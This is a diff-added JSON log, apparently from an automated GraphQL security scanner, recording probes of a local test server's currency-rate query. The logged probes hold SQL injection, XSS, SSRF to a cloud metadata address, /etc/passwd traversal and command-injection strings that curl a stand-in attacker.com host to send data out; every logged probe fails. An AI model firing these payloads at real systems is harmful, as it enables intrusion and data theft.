+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-07T02:30:20.650768Z",
+    "count": 66,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM currencies--\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:30:22.974246Z",
+    "count": 67,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<script>alert(document.domain)</script>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:30:24.631533Z",
+    "count": 68,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"http://169.254.169.254/latest/meta-data/\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:30:27.269178Z",
+    "count": 69,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD; curl http://attacker.com/$(whoami)\", foreignCurrencySymbol: null)\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:30:30.222611Z",
+    "count": 70,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"../../../../etc/passwd\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:30:32.040247Z",
+    "count": 71,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<img src='x' onerror='alert(1)'>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:30:33.857892Z",
+    "count": 72,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\")\n  getCurrentRate(mainCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.011,
+        "timestamp": "2025-10-07T02:30:36.056568Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 3
+                },
+                {
+                  "line": 4,
+                  "column": 3
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+                    "    at Object.SelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/OverlappingFieldsCanBeMergedRule.js:67:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                    "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                    "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                    "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                    "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                    "    at Generator.next (<anonymous>)",
+                    "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                    "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-07T02:30:36.062022Z",
+        "response_body": {
+          "data": {
+            "first": null,
+            "second": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 73,
+    "timestamp": "2025-10-07T02:30:36.062062Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.013,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  first: getCurrentRate(mainCurrencySymbol: \"USD\")\n  second: getCurrentRate(mainCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.009,
+        "timestamp": "2025-10-07T02:30:38.153413Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 3
+                },
+                {
+                  "line": 4,
+                  "column": 3
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+                    "    at Object.SelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/OverlappingFieldsCanBeMergedRule.js:67:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                    "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                    "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                    "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                    "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                    "    at Generator.next (<anonymous>)",
+                    "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                    "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-07T02:30:38.159102Z",
+        "response_body": {
+          "data": {
+            "first": null,
+            "second": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 74,
+    "timestamp": "2025-10-07T02:30:38.159132Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    types {\n      name\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-07T02:30:40.730316Z",
+    "count": 75,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", __typename: \"Exploit\")\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:30:43.273948Z",
+    "count": 76,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"__typename\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 45
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Unknown argument \"__typename\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-07T02:31:34.632993Z",
+    "count": 77,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM currencies--\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-07T02:31:37.307782Z",
+    "count": 78,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"<img src=x onerror=alert(1)>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:31:39.207603Z",
+    "count": 79,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"http://169.254.169.254/latest/meta-data\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-07T02:31:42.069105Z",
+    "count": 80,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"; curl https://attacker.com/exfil\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-07T02:31:44.015716Z",
+    "count": 81,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"../../../etc/passwd\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-07T02:31:46.063017Z",
+    "count": 82,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"<h1>USD</h1>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:31:48.754263Z",
+    "count": 83,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  a1: getCurrentRate(mainCurrencySymbol: \"GBP\")\n  a2: getCurrentRate(mainCurrencySymbol: \"JPY\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.012,
+        "timestamp": "2025-10-07T02:31:50.337019Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 3
+                },
+                {
+                  "line": 4,
+                  "column": 3
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+                    "    at Object.SelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/OverlappingFieldsCanBeMergedRule.js:67:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                    "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                    "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                    "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                    "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                    "    at Generator.next (<anonymous>)",
+                    "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                    "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-07T02:31:50.344998Z",
+        "response_body": {
+          "data": {
+            "a1": null,
+            "a2": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 84,
+    "timestamp": "2025-10-07T02:31:50.345076Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.014,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    queryType {\n      name\n      fields {\n        name\n        args {\n          name\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-07T02:31:52.939939Z",
+    "count": 85,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"EUR\", invalidArg: \"exploit\")\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:31:55.536037Z",
+    "count": 86,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"invalidArg\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 45
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
